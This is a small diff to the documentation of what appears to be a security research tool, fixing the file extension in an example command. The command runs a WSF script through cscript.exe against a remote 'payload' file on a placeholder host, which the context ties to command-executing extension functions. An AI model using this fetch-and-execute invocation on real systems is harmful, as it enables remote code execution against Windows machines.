@@ -89,7 +89,7 @@ command-executing extension functions.
 
 Example invocation:
 
-    cscript.exe program.wsf https://example.com/payload.wml
+    cscript.exe program.wsf https://example.com/payload.xml
 
 Use this only in controlled environments for research or testing.
 
